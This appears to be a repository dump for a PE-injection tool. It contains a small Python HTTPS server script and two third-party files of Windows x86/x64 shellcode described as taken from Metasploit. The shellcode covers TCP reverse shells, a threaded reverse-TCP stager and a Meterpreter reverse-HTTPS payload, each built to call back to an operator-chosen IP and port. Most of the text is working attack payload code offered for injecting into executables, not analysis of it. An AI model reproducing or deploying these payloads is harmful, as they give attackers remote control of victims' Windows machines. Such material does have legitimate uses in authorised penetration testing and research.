CONFIG_KEY_IP = 'ip'
CONFIG_KEY_PORT = 'port'
CONFIG_KEY_LOCAL = 'localhostonly'
CONFIG_KEY_CERT = 'cert'
CONFIG_KEY_SSL = 'usessl'
CONFIG_KEY_AUTH = 'basicauth'
CONFIG_KEY_PASSHASH = 'passhash'
CONFIG_KEY_TOKEN = 'token'


"""
Create and run the HTTPS-server

self-signed certificate: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
ssl-doc: https://docs.python.org/3/library/ssl.html#ssl-contexts
"""
def run_https_server(cert="server.pem", ip='0.0.0.0', port=443, usessl=True):

    # build server
    server_address = (ip, port)                                           # listen to all interfaces
    handler = ServerHandler.SimplePostHTTPRequestHandler                  # create handler
    httpd = http.server.HTTPServer(server_address, handler)               # create HTTP-Server
    if usessl:
        # config SSLContext
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)      # create SSLContext with only TLS 1.2
        context.options |= ssl.OP_CIPHER_SERVER_PREFERENCE  # use the server cipher ordering preference
        context.options |= ssl.OP_SINGLE_DH_USE             # prevents re-use of the same DH key for distinct SSL sessions (requires more computational resources)
        context.options |= ssl.OP_SINGLE_ECDH_USE           # prevents re-use of the same ECDH key for distinct SSL sessions (requires more computational resources)
        context.load_cert_chain(cert)                       # load a private key and the corresponding certificate (all in one file)
        context.set_ciphers('HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS')  # set the ciphers (OpenSSL cipher list format)
        # install SSL-Socket
        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

    # print infos
    print("Python", python_version())
    sa = httpd.socket.getsockname()
    if usessl:
        print("Serving HTTPS on", sa[0], "port", sa[1], "(cert:", cert, ") ...")
    else:
        print("Serving HTTP on", sa[0], "port", sa[1], "...")

    # run
    httpd.serve_forever()  # Handle requests, FOREVER!


"""
MAIN
"""
if __name__ == '__main__':

    # default vars
    default_ip = '0.0.0.0'
    default_port = 443
    default_cert="server.pem"
    default_usessl=True

    # read/write config
    config = configparser.ConfigParser()
    config.read(CONFIG_FILE)

    if CONFIG_SECTION_WEB in config:
        web = config[CONFIG_SECTION_WEB]
        # ip
        if web.getboolean(CONFIG_KEY_LOCAL, fallback=True):
            default_ip = '127.0.0.1'
        else:
            default_ip = '0.0.0.0'
        # port
        default_port = web.get(CONFIG_KEY_PORT, fallback=default_port)
        # cert
        default_cert = web.get(CONFIG_KEY_CERT, fallback=default_cert)
        # ssl
        default_usessl = web.getboolean(CONFIG_KEY_SSL, fallback=default_usessl)

    # parser for command-line options, arguments and sub-commands
    help_text = "create a self-signed certificate: 'openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes'"
    parser = argparse.ArgumentParser(description=help_text)
    parser.add_argument('-i', '--ip', help='listen ip [default: 0.0.0.0]', default=default_ip)
    parser.add_argument('-p', '--port', type=int, help='listen on TCP port [default: 443]', default=default_port)
    parser.add_argument('-c', '--cert', help='listen on TCP port [default: server.pem]', default=default_cert)
    parser.add_argument('-s', '--ssl', help='use ssl [default: true]', default=default_usessl)
    args = parser.parse_args()

    # run run_http(s)_server
    run_https_server(cert=args.cert, ip=args.ip, port=args.port, usessl=args.ssl)

```

`pe-injector-control/thirdparty/WinIntelPE32.py`:

```py
"""

Copyright (c) 2013-2015, Joshua Pitts
All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice,
    this list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
    may be used to endorse or promote products derived from this software without
    specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

"""


##########################################################
#               BEGIN win32 shellcodes                   #
##########################################################
import struct

class winI32_shellcode():
    """
    Windows Intel x32 shellcode class
    """

    def __init__(self, host, port, supplied_shellcode):
        # could take this out HOST/PORT and put into each shellcode function
        self.host = host
        self.port = port
        self.supplied_shellcode = supplied_shellcode
        self.shellcode1 = None
        self.shellcode2 = None
        self.hostip = None
        self.stackpreserve = b"\x90\x90\x60\x9c"
        self.stackrestore = b"\x9d\x61"

    def __pack_ip_addresses(self):
        hostocts = []
        for i, octet in enumerate(self.host.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def reverse_shell_tcp(self):
        """
        metasploit windows/shell_reverse_tcp
        """

        self.shellcode1 = b"\xfc\xe8"

        self.shellcode1 += b"\x89\x00\x00\x00"

        self.shellcode1 += (b"\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
                            b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
                            b"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
                            b"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
                            b"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
                            b"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
                            b"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
                            b"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
                            b"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
                            b"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86"
                            )

        self.shellcode2 = (b"\x5d\x68\x33\x32\x00\x00\x68"
                           b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
                           b"\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
                           b"\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7"
                           b"\x68"
                           )
        self.shellcode2 += self.__pack_ip_addresses()  # IP
        self.shellcode2 += b"\x68\x02\x00"
        self.shellcode2 += struct.pack('!H', self.port)  # PORT
        self.shellcode2 += (b"\x89\xe6\x6a\x10\x56"
                            b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3"
                            b"\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24"
                            b"\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56"
                            b"\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89"
                            # The NOP in the line below allows for continued execution.
                            b"\xe0\x4e\x90\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0"
                            b"\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80"
                            b"\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
                            b"\x81\xc4\xfc\x01\x00\x00"
                            )

        return self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore

    def reverse_tcp_stager_threaded(self):
        """
        Reverse tcp stager. Can be used with windows/shell/reverse_tcp or
        windows/meterpreter/reverse_tcp payloads from metasploit.
        """

        self.shellcode2 = b"\xE8\xB7\xFF\xFF\xFF"

        self.shellcode2 += (b"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B\x52"
                            b"\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC"
                            b"\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57\x8B"
                            b"\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01\xD0"
                            b"\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B\x01"
                            b"\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4\x03"
                            b"\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B\x0C"
                            b"\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B"
                            b"\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D\x68"
                            b"\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF"
                            b"\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF"
                            b"\xD5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5"
                            b"\x97\x6A\x05\x68"
                            )
        self.shellcode2 += self.__pack_ip_addresses()  # IP
        self.shellcode2 += b"\x68\x02\x00"
        self.shellcode2 += struct.pack('!H', self.port)
        self.shellcode2 += (b"\x89\xE6\x6A"
                            b"\x10\x56\x57\x68\x99\xA5\x74\x61\xFF\xD5\x85\xC0\x74\x0C\xFF\x4E"
                            b"\x08\x75\xEC\x68\xF0\xB5\xA2\x56\xFF\xD5\x6A\x00\x6A\x04\x56\x57"
                            b"\x68\x02\xD9\xC8\x5F\xFF\xD5\x8B\x36\x6A\x40\x68\x00\x10\x00\x00"
                            b"\x56\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x6A\x00\x56\x53"
                            b"\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x01\xC3\x29\xC6\x85\xF6\x75\xEC\xC3"
                            )

        # Shellcode1 is the thread
        self.shellcode1 = (b"\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B"
                           b"\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02"
                           b"\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61"
                           b"\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B"
                           b"\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48"
                           b"\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0"
                           b"\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B"
                           b"\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF"
                           b"\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D"
                           b"\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B"
                           b"\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04"
                           b"\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB"
                           b"\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90"
                           b"\x5D\x90"
                           b"\xBE")
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)
        self.shellcode1 += (b"\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
                            b"\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
                            b"\x89\xF1"
                            )

        self.shellcode1 += b"\xeb\x44"  # <--length of shellcode below
        self.shellcode1 += b"\x90\x5e"
        self.shellcode1 += (b"\x90\x90\x90"
                            b"\xF2\xA4"
                            b"\xE8\x20\x00\x00"
                            b"\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06"
                            b"\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF"
                            b"\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5"
                            b"\x58\x58\x90\x61"
                            )

        self.shellcode1 += b"\xe9"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        return self.stackpreserve + self.shellcode1 + self.shellcode2

    def meterpreter_reverse_https_threaded(self):
        """
        Traditional meterpreter reverse https shellcode from metasploit
        payload/windows/meterpreter/reverse_https
        """

        self.shellcode2 = b"\xE8\xB7\xFF\xFF\xFF"

        self.shellcode2 += (b"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
                            b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
                            b"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
                            b"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
                            b"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
                            b"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
                            b"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
                            b"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
                            b"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
                            b"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68"
                            b"\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57"
                            b"\x57\x57\x57\x6a\x00\x54\x68\x3a\x56\x79\xa7\xff\xd5\xeb\x5f"
                            b"\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68")
        self.shellcode2 += struct.pack("<H", self.port)
        self.shellcode2 += (b"\x00\x00\x53"
                            b"\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x48\x59\x31\xd2\x52\x68"
                            b"\x00\x32\xa0\x84\x52\x52\x52\x51\x52\x50\x68\xeb\x55\x2e\x3b"
                            b"\xff\xd5\x89\xc6\x6a\x10\x5b\x68\x80\x33\x00\x00\x89\xe0\x6a"
                            b"\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86\xff\xd5\x31\xff\x57"
                            b"\x57\x57\x57\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1a"
                            b"\x4b\x74\x10\xeb\xd5\xeb\x49\xe8\xb3\xff\xff\xff\x2f\x48\x45"
                            b"\x56\x79\x00\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00"
                            b"\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff"
                            b"\xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68"
                            b"\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xcd\x8b\x07\x01\xc3\x85"
                            b"\xc0\x75\xe5\x58\xc3\xe8\x51\xff\xff\xff")
        self.shellcode2 += self.host.encode('Ascii')
        self.shellcode2 += b"\x00"

        # shellcode1 is the thread
        self.shellcode1 = (b"\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B"
                           b"\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02"
                           b"\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61"
                           b"\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B"
                           b"\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48"
                           b"\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0"
                           b"\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B"
                           b"\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF"
                           b"\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D"
                           b"\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B"
                           b"\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04"
                           b"\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB"
                           b"\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90"
                           b"\x5D\x90"
                           )

        self.shellcode1 += b"\xBE"
        self.shellcode1 += struct.pack("<H", len(self.shellcode2) - 5)
        self.shellcode1 += b"\x00\x00"  # <---Size of shellcode2 in hex
        self.shellcode1 += (b"\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
                            b"\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
                            b"\x89\xF1"
                            )
        self.shellcode1 += b"\xeb\x44"   # <--length of shellcode below
        self.shellcode1 += b"\x90\x5e"
        self.shellcode1 += (b"\x90\x90\x90"
                            b"\xF2\xA4"
                            b"\xE8\x20\x00\x00"
                            b"\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06"
                            b"\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF"
                            b"\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5"
                            b"\x58\x58\x90\x61"
                            )

        self.shellcode1 += b"\xE9"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        return self.stackpreserve + self.shellcode1 + self.shellcode2

    def demo_calc(self):
        """
        win32 start calc shellcode
        """
        return (b"\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64\x8B\x72\x30\x8B\x76\x0C\x8B"
               b"\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01"
               b"\xFE\x8B\x4C\x1F\x24\x01\xF9\x0F\xB7\x2C\x51\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45"
               b"\x75\xF1\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\xAE\xFF\xD7")

    def demo_nop(self):
        """
        just nop!
        """
        return b"\x90"

    def user_supplied_shellcode(self):
        """
        win32 raw/binary shellcode
        """

        return self.supplied_shellcode

    def user_supplied_shellcode_threaded(self):
        """
        This module allows for the user to provide a win32 raw/binary
        shellcode. Make sure to use a process safe exit function.
        """

        # Begin shellcode 2:
        self.shellcode2 = b"\xE8\xB7\xFF\xFF\xFF"
        self.shellcode2 += self.supplied_shellcode

        self.shellcode1 = (b"\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B"
                           b"\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02"
                           b"\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61"
                           b"\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B"
                           b"\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48"
                           b"\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0"
                           b"\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B"
                           b"\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF"
                           b"\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D"
                           b"\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B"
                           b"\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04"
                           b"\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB"
                           b"\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90"
                           b"\x5D\x90"
                           b"\xBE")
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)

        self.shellcode1 += (b"\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
                            b"\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
                            b"\x89\xF1"
                            )

        self.shellcode1 += b"\xeb\x44"  # <--length of shellcode below

        self.shellcode1 += b"\x90\x5e"
        self.shellcode1 += (b"\x90\x90\x90"
                            b"\xF2\xA4"
                            b"\xE8\x20\x00\x00"
                            b"\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06"
                            b"\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF"
                            b"\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5"
                            b"\x58\x58\x90\x61"
                            )

        self.shellcode1 += b"\xe9"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        return self.stackpreserve + self.shellcode1 + self.shellcode2

##########################################################
#                END win32 shellcodes                    #
##########################################################
```

`pe-injector-control/thirdparty/WinIntelPE64.py`:

```py
"""

Copyright (c) 2013-2015, Joshua Pitts
All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice,
    this list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
    may be used to endorse or promote products derived from this software without
    specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

"""

##########################################################
#               BEGIN win64 shellcodes                   #
##########################################################

import struct


class winI64_shellcode():
    """
    Windows Intel x64 shellcode class
    """

    def __init__(self, host, port, supplied_shellcode):
        self.host = host
        self.port = port
        self.supplied_shellcode = supplied_shellcode
        self.shellcode1 = None
        self.shellcode2 = None
        self.hostip = None
        self.stackpreserve = (b"\x90\x90\x50\x53\x51\x52\x56\x57\x54\x55\x41\x50"
                              b"\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        self.stackrestore = (b"\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                             b"\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58"
                             )

    def __pack_ip_addresses(self):
        hostocts = []
        for i, octet in enumerate(self.host.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def reverse_shell_tcp(self):
        """
        Modified metasploit windows/x64/shell_reverse_tcp
        """

        self.shellcode1 = (b"\xfc"
                           b"\x48\x83\xe4\xf0"
                           b"\xe8")

        self.shellcode1 += b"\xc0\x00\x00\x00"

        self.shellcode1 += (b"\x41\x51\x41\x50\x52"
                            b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                            b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                            b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                            b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                            b"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
                            b"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
                            b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
                            b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
                            b"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
                            b"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
                            b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
                            b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
                            b"\x8b\x12\xe9\x57\xff\xff\xff")

        self.shellcode2 = (b"\x5d\x49\xbe\x77\x73\x32\x5f\x33"
                           b"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
                           b"\x49\x89\xe5\x49\xbc\x02\x00")
        self.shellcode2 += struct.pack('!H', self.port)
        self.shellcode2 += self.__pack_ip_addresses()
        self.shellcode2 += (b"\x41\x54"
                            b"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
                            b"\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
                            b"\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
                            b"\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
                            b"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
                            b"\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
                            b"\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
                            b"\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
                            b"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
                            b"\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
                            b"\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
                            b"\x48\x31\xd2\x90\x90\x90\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
                            b"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
                            b"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
                            b"\x72\x6f\x6a\x00\x59\x41\x89\xda"
                            b"\x48\x81\xc4\xf8\x00\x00\x00"  # Add RSP X ; align stack
                            )

        return self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore

